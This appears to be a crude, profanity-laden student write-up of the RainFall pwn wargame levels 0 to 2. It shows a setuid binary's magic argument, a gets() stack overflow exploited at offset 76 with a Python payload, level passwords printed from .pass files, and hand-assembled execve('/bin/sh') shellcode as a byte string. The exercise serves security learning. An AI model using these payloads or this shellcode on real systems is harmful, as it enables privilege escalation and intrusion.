# rainfall
Kill me, I'm getting kicked out, this is an intro to pwn I think
```
level0@RainFall:~$ ./level0 
Segmentation fault (core dumped)
```
*wtf fucking kill me, I give up*
```
level0@RainFall:~$ file level0 
level0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x85cf4024dbe79c7ccf4f30e7c601a356ce04f412, not stripped
```
*yay not stripped*
```
level0@RainFall:~$ ls -al
-rwsr-x---+ 1 level1 users  747441 Mar  6  2016 level0
```
*nice, the SUID perm again*

Using **binary ninja**, found that the executable calls execve("/bin/sh")
```
mov     dword [esp], data_80c5348  {"/bin/sh"}
call    execv
```
## ROP ( Return-oriented programming) exploit
Googled it, although I've done pwning before but still can't fucking explain anything

**The main idea is to use the existing small fragments in the program based on the stack buffer overflow. ) to change the value of some registers or variables to control the execution flow of the program.**

It's called ROP because we use the **ret** instruction to change the order in which the instruction stream is executed.

### What the fuck am I doing

```
level0@RainFall:~$ checksec --file level0 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   level0
```
*NX is enabled, meaning you can't use shellcode or put anything on the stack in order to execute it.*

**binary ninja**
```
mov     dword [esp {var_30}], eax
call    atoi
cmp     eax, 0x1a7
```
*compares atoi(arg) to **0x1a7 which is 423**, I love me those compares*
```
level0@RainFall:~$ ./level0 423
$ ls
ls: cannot open directory .: Permission denied
$ getflag
/bin/sh: 2: getflag: not found
$ /bin/getflag
/bin/sh: 3: /bin/getflag: not found
```
*so it opend a shell using execv('/bin/sh'), but nothing special is happening when i execute anything*

this shit calls **setresuid** and a bunch of weird looking functions before execv
### I dont know the point of this project yeeeet, that's why I'm fucking executing getflag from the snowcrash shit
Oh so I need to find a way to read a .pass file in the next user's home directoryy

*ugh*

```
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```
**yayyyy**
```
level0@RainFall:~$ su level1
Password:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```
## level1
```
level1@RainFall:~$ file level1 
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```
*yay, good mood today*

Executable waits for input then when u enter input it fucking leaves, the fuck

**binary ninja this bitch**
```
call    gets
leave    {__saved_ebp}
retn     {__return_addr}
```
*yup gets then ret, kill me*

Buuuut there's a function run, that isn't called anywhere in the main, with a call to **system('/bin/sh')**
```
mov     dword [esp {var_1c}], data_8048584  {"/bin/sh"}
call    system
```
### how the fuck do you jump to this stupid shit
the binary is an **ELF 32-bit LSB executable**, need to find address of the run function and jump to it

address of run function **08048444** using objdump -d, **8048496** is for RET instruction to jump to break in it and overrid RIP with the run function address
```
level1@RainFall:~$ gdb ./level1
(gdb) b main
Breakpoint 1 at 0x8048483
(gdb) b *8048496
Breakpoint 2 at 0x7acf70
(gdb) r
Starting program: /home/user/level1/level1 
Warning:
Cannot insert breakpoint 2.
Error accessing memory address 0x7acf70: Input/output error.

(gdb) disassemble main 
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
(gdb) b *main+22
```
gdb fucking got retarded, so hat to clear all breakpoints using **clear breakpoint**
```
(gdb) c
Continuing.
hello

Breakpoint 3, 0x08048496 in main ()
(gdb) set $eip=0x08048444
(gdb) c
Continuing.
Good... Wait what?
$ cat /home/user/level2/.pass
cat: /home/user/level2/.pass: Permission denied
```
**what the fuck whyyyyyyyy**

So apparently gdb runs executable without SUID
```
$ id
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
```
**FUCKING KILL ME**, would've been so easyyyy, why is life so hard ans unfair
#### getting the fucking offset to EIP, because I'm gay
buffer overflow occurs because the gets() function doesnt have a limit on the reading size
```
level1@RainFall:~$ python -c "print 'A' * 100" | ./level1 
Segmentation fault (core dumped)
```
run it with gdb
```
level1@RainFall:~$ gdb ./level1 
(gdb) r < /tmp/A
Starting program: /home/user/level1/level1 < /tmp/A

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
ebp            0x41414141       0x41414141
eip            0x41414141       0x41414141
```
registers EIP and EBP were overwritten with AAAA.., so I kept trying stupid shit

*with 100, it segfaults, 50 nope, 60 nope, 70 nope, **80** yes, now 75 nope, **76** ding ding ding*
```
(gdb) r
Starting program: /home/user/level1/level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```
### writing payload
offset is 76, maybe, and in gdn eip wasnt ovewritten with AAA.. like with offset 100

So, I guess 'A' * 76 + [address_of_run = **0x08048444**]
```
rainfall git:(main) ✗ python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
```
trying it
```
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/tfou
level1@RainFall:~$ cat /tmp/tfou | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
```
found that **cat -** is used to block input
```
level1@RainFall:~$ cat /tmp/tfou -| ./level1 
Good... Wait what?
ls
ls: cannot open directory .: Permission denied
id  
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
*yay*
```
level1@RainFall:~$ su level2
Password:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
## level2, a.k.a last level promis juré
```
level2@RainFall:~$ ls -l level2 
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
level2@RainFall:~$ file level2 
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```
the usual, why do I keep doing this, to see that **not stripped**, pretty sexy
```
level2@RainFall:~$ ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
**binary ninja**, main function calls a function **p**, what kind of fucking lazy name is that
```
lea     eax, [ebp-0x4c {var_50}] 
call    gets
```
*offset is 76 again??, dk dc yet*

### there is not system() therefore no shell to jump to, kill me
*Shellcode refers to the assembly code used to complete a function. The common function is to get the shell of the target system.*

**On the basis of the stack overflow, in order to execute the shellcode, the corresponding binary is required at runtime, and the area where the shellcode is located has executable permissions.**

-- *from* **https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/**

#### crafting shellcode in assembly to l ater inject in executable memory segment, cuz I have no life
Shiiiiiit, so, **shellcode is machine code that when executed spawns a shell, sometimes.**, not all the time, I didnt need to know this

*experimenting*
```
char shellcode[] = "";      
int
main (int argc, char **argv)
{
        int (*ret)();              /* ret is a function pointer */
        ret = (int(*)())shellcode; /* ret points to our shellcode */
                                   /* shellcode is type cast as a function */
        (int)(*ret)();             /* execute, as a function,        shellcode[] */
        exit(0);                   /* exit() */
}
```
*C program to test shellcode*
```
.global _start
_start:
   xor eax, eax
   movb eax, 1
   xor ebx, ebx
   int 0x80
```
*simple exit*

**nope, too many syntax errors**
```
.global _start
_start:
   xor %eax, %eax
   mov $1, %eax
   xor %ebx, %ebx
   int $0x80
```
Noice, now assemble and link that shit
```
level2@RainFall:/tmp$ as exit.s -o exit.o
level2@RainFall:/tmp$ ld exit.o -o exit
level2@RainFall:/tmp$ objdump -d exit

exit:     file format elf32-i386


Disassembly of section .text:

08048054 <_start>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       b8 01 00 00 00          mov    $0x1,%eax
 804805b:       31 db                   xor    %ebx,%ebx
 804805d:       cd 80                   int    $0x80
```
*now those weird bytes are the opcode **31 c0** these*

We make a string out of them
```
"\x31\xc0\xb8\x01\x31\xdb\xcd\x80"
```
and use it in the global shellcode variable
```
char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
```
aaaand this shit segfaults
```
level2@RainFall:/tmp$ ./main 
Segmentation fault (core dumped)
```
**wtf, kill me**

Went online, ad this is how the main should look like
```
char shellcode[] = "\x31\xc0\x40\x89\xc3\xcd\x80";      
int main (int argc, char **argv)
{
        void (*shell)() = (void*) &shellcode;             
        shell();             
}
```
Still segfaults, so the main wasnt the problem, **the shellcode is in non-executable memory. Try recompiling the program with the -fno-stack-protector and the -z execstack flags enabled.**
```
gcc -fno-stack-protector -z execstack
```
and
```
level2@RainFall:/tmp$ ./a.out 
level2@RainFall:/tmp$ echo $?
1
```
noice
### Now the /bin/sh shellcode
Need a way to call execve with argument "/bin/sh", **pushing it to stack ??**, **11** is the syscall number for execv
```
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $11,%al
int    $0x80
```
getting opcode
```
level2@RainFall:/tmp$ as shell.s -o shell.o
level2@RainFall:/tmp$ ld -o shell shell.o
level2@RainFall:/tmp$ objdump -d shell

shell:     file format elf32-i386


Disassembly of section .text:

08048054 <_start>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       50                      push   %eax
 8048057:       68 2f 2f 73 68          push   $0x68732f2f
 804805c:       68 2f 62 69 6e          push   $0x6e69622f
 8048061:       89 e3                   mov    %esp,%ebx
 8048063:       50                      push   %eax
 8048064:       53                      push   %ebx
 8048065:       89 e1                   mov    %esp,%ecx
 8048067:       b0 0b                   mov    $0xb,%al
 8048069:       cd 80                   int    $0x80
```
shellcode
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```
